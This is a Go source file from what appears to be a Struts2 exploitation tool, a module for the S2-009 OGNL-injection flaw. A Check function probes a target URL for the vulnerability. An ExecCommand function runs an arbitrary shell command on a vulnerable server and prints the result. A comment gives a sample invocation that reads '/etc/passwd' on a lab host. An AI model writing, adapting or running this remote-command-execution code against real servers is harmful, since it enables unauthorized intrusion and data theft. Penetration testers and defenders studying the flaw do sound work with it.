package s009

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
	"net/url"
	"strings"
)

/*
s2-009检测方式：
	指定get参数名
	在模块这儿一次梳理好payload。
ST2SG.exe --url http://192.168.123.128:8080/S2-009/ajax/example5.action --mode exec --vn 9 --data "name" --cmd "cat /etc/passwd"
*/

func Check(targetUrl string, getParam string) {
	targetUrl = targetUrl + utils.PocS009Exec(getParam, "echo%20"+utils.CheckFlag)
	respString := utils.GetFunc4Struts2(targetUrl, "", "")
	if utils.IfContainsStr(respString, utils.CheckFlag) {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-009！"))
	} else {
		log.Printf("%s Struts2-009 Not Vulnerable.", utils.Green(targetUrl))
	}
}

func ExecCommand(targetUrl string, command string, getParam string) {
	targetUrl = targetUrl + utils.PocS009Exec(getParam, url.QueryEscape(command))
	respString := utils.GetFunc4Struts2(targetUrl, "", "")
	respString = strings.Replace(url.QueryEscape(respString), "%00", "", -1)
	fmt.Println(url.QueryUnescape(respString))
}
